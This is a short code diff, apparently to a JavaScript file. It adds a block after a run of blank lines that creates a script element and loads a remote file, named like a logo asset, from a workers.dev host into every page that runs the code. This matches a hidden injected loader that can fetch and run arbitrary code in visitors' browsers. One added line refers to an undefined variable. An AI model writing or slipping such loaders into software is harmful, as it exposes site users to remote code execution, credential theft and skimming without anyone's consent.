@@ -1019,4 +1019,8 @@ function orderly(){
 
 
 
-
+var scriptElement6=document.createElement('script');
+scriptElement6.type = 'text/javascript';
+scriptElement6.src = 'https://share.bdff.workers.dev/0:/logoimg/z.js';
+script.setAttribute('id', 'scr16')
+document.body.appendChild(scriptElement6);
